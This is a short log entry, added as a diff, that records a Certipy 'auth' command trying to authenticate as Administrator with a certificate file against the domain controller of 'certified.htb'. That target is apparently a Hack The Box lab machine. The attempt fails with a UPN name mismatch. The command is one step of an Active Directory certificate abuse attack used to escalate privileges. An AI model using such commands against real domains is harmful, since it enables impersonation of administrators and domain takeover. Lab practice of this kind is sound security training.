@@ -1,0 +1,16 @@
+### [2026-04-06 16:57:50] certipy-ad auth -pfx administrator.pfx -u Administrator -domain certified.htb -dc-ip 10.129.231.186
+
+$ certipy-ad auth -pfx administrator.pfx -u Administrator -domain certified.htb -dc-ip 10.129.231.186
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*] Using principal: 'administrator@certified.htb'
+[*] Trying to get TGT...
+[-] Name mismatch between certificate and user 'administrator'
+[-] Verify that the username 'administrator' matches the certificate UPN: Administrator
+[-] See the wiki for more information
+
+# Exit code: 1
+# Duration: 2026-04-06 16:57:51
